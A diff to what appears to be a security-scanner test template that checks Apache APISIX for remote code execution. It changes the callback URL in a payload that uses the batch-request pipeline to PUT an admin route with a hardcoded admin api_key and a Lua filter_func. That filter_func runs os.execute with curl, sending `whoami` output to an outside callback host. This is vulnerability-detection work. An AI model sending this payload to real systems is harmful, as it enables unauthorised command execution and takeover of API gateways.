@@ -46,7 +46,7 @@ execute:
           Accept-Encoding: "gzip, deflate"
       - send_ssrf_req:
           url: "https://test-services.akto.io/store_uuid/${random_uuid}"
-      - replace_body: '{"headers":{"X-Real-IP":"127.0.0.1","Content-Type":"application/json"},"timeout":1500,"pipeline":[{"method":"PUT","path":"/apisix/admin/routes/index?api_key=edd1c9f034335f136f87ad84b625c8f1","body":"{\r\n \"name\": \"test\", \"method\": [\"GET\"],\r\n \"uri\": \"/api/abcdefgh\",\r\n \"upstream\":{\"type\":\"roundrobin\",\"nodes\":{\"httpbin.org:80\":1}}\r\n,\r\n\"filter_func\": \"function(vars) os.execute("curl https://test-services.akto.io/store_uuid/${random_uuid}/`whoami`"); return true end\"}"}]}'
+      - replace_body: '{"headers":{"X-Real-IP":"127.0.0.1","Content-Type":"application/json"},"timeout":1500,"pipeline":[{"method":"PUT","path":"/apisix/admin/routes/index?api_key=edd1c9f034335f136f87ad84b625c8f1","body":"{\r\n \"name\": \"test\", \"method\": [\"GET\"],\r\n \"uri\": \"/api/abcdefgh\",\r\n \"upstream\":{\"type\":\"roundrobin\",\"nodes\":{\"httpbin.org:80\":1}}\r\n,\r\n\"filter_func\": \"function(vars) os.execute("curl https://test-services.akto.io/${random_uuid}/`whoami`"); return true end\"}"}]}'
       - validate:
           response_code:
             gte: 505
